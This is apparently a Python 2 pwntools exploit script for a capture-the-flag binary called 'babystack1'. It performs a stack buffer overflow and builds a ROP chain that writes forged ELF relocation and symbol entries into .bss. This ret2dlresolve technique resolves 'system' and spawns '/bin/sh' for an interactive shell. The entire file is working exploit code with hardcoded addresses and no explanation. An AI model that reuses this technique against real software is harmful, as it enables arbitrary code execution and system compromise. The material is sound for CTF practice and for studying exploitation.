from pwn import *
import time
from hashlib import sha256

elf = ELF("./babystack1")

play_addr = 0x0804843C
plt_read=elf.plt['read']
dynsym_start = 0x80481cc
bss_start = 0x0804A030#0x804A020
rel_plt_start = 0x80482b0
index_arg = bss_start - rel_plt_start

dynstr_start = 0x804822c
got_start = 0x0804A000

fake_Elf32_Rel_addr = bss_start + 0x8
n = (fake_Elf32_Rel_addr - dynsym_start)/0x10
r_info = n<<8

fake_Elf32_Sym_addr = bss_start + 0x4*8
st_name = fake_Elf32_Sym_addr - dynstr_start

def z(a=''):
    gdb.attach(io,a)
    if a == '':
        raw_input()

padding = 'A'*0x28
def hole(io,msg):
    sleep(0.1)
    io.send(padding+msg+p32(0x08048461))

for char in xrange(0,0x46):
	io = process('./babystack1')
	payload = []

	payload.append(p32(plt_read))	
	payload.append(p32(0x080484E9))	
	payload.append(p32(0))		
	payload.append(p32(bss_start))	
	payload.append(p32(0x4*12))	

	payload.append(p32(0x080482F0)) 
	payload.append(p32(index_arg))
	payload.append(p32(play_addr))
	payload.append(p32(bss_start + 0x4*10))

	i = len(payload)
	for msg in reversed(payload): 
		log.info(i)
		i = i-1
		hole(io,str(msg))

	sleep(0.1)
	
	io.send('A'*(0x28 + 4)+p32(0x08048456))
#	z()
	sleep(0.1)

	#ELF32_R_TYPE(r_info)=7
	#mytype = (r_info) & 0xff

	payload = ''
	payload += p32(0x804A008) + p32(r_info + 7)
	payload += p32(st_name) + p32(0)*5		
	payload += 'system\x00\x00'			
	payload += '/bin/sh\x00'
	io.sendline(payload)
	pause()

#	sleep(0.1)
	io.interactive()
